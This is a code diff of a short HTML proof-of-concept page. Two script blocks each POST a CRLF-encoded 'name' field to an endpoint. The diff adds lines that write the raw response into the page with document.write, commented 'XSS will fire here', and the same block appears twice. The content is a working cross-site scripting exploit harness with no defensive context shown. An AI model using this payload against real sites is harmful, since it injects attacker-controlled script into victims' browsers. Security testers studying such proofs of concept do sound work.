@@ -19,6 +19,10 @@
 
   // Send raw POST body as-is
   xhr.send("name=%0D%0A&id=1a2ee6d42f1b90c81db2ae0f66e094c7");
+    // Write response directly to DOM
+  document.open();
+  document.write(xhr.responseText); // ✅ XSS will fire here
+  document.close();
 </script>
 <script>
   var xhr = new XMLHttpRequest();
@@ -27,6 +31,10 @@
 
   // Send raw POST body as-is
   xhr.send("name=%0D%0A&id=1a2ee6d42f1b90c81db2ae0f66e094c7");
+    // Write response directly to DOM
+  document.open();
+  document.write(xhr.responseText); // ✅ XSS will fire here
+  document.close();
 </script>
   </body>
 </html>
